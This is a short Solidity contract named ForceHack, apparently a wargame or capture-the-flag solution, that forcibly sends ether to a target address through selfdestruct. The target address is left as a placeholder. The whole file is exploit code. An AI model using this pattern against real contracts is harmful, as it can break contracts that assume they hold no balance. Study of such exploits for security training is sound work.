// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceHack {
    
    address payable ogContract = *your instance address*;
    
    function attack() public payable {
        require(msg.value > 0);
        selfdestruct(ogContract);
    }
}